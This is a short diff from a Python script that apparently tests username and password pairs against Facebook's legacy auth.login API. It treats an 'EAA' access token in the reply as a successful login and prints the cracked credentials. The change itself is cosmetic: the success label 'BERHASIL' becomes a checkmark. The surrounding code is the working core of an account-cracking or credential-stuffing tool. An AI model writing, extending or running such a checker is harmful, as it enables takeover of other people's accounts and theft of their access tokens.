@@ -165,7 +165,7 @@ def login(username,password,cek=False):
           api = 'https://b-api.facebook.com/method/auth.login'
           response = requests.get(api, params=params)
           if 'EAA' in response.text:
-              print(f"\r\033[00m[\033[1;32mBERHASIL\033[00m] \033[1;32m{username}\033[90m|\033[1;32m{password}                        ",end="")
+              print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username}\033[90m|\033[1;32m{password}                        ",end="")
               print()
               result += 1
               if cek:
